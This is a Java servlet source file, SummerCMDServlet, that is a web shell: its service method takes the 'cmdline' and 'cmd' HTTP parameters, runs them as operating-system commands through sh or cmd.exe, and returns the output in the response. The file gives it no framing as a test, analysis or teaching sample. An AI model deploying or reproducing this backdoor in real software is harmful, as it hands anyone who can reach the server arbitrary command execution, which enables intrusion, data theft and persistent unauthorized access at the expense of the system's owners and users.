package com.summer233;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

public class SummerCMDServlet implements Servlet {
   public SummerCMDServlet() {
   }

   @Override
   public void init(ServletConfig servletConfig) throws ServletException {
   }

   @Override
   public ServletConfig getServletConfig() {
      return null;
   }

   @Override
   public void service(ServletRequest servletRequest, ServletResponse servletResponse)
         throws ServletException, IOException {
      servletResponse.setContentType("text/html; charset=UTF-8");
      servletResponse.setCharacterEncoding("UTF-8");
      servletResponse.getWriter().println("this is a SummerCMDServlet<br>");
      HttpServletRequest req = (HttpServletRequest) servletRequest;
      String cmdline = req.getParameter("cmdline");
      if (cmdline != null) {
         boolean isLinux = true;
         String osTyp = System.getProperty("os.name");
         if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
         }
         String[] cmds = isLinux ? new String[] { "sh", "-c", cmdline }
               : new String[] { "cmd.exe", "/c", cmdline };
         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
         Scanner s = new Scanner(in).useDelimiter("\\a");
         String output = s.hasNext() ? s.next() : "";
         servletResponse.getWriter().write(output);
         servletResponse.getWriter().flush();
         servletResponse.getWriter().close();
      }

      String cmd = servletRequest.getParameter("cmd");
      boolean isLinux = true;
      String osTyp = System.getProperty("os.name");
      if (osTyp != null && osTyp.toLowerCase().contains("win")) {
         isLinux = false;
      }
      String[] cmds = isLinux ? new String[] { "sh", "-c", cmd } : new String[] { "cmd.exe", "/c", cmd };
      InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
      Scanner s = new Scanner(in).useDelimiter("\\a");
      String output = s.hasNext() ? s.next() : "";
      PrintWriter out = servletResponse.getWriter();
      out.println(output);
      out.flush();
      out.close();
   }

   @Override
   public String getServletInfo() {
      return null;
   }

   @Override
   public void destroy() {
   }
}
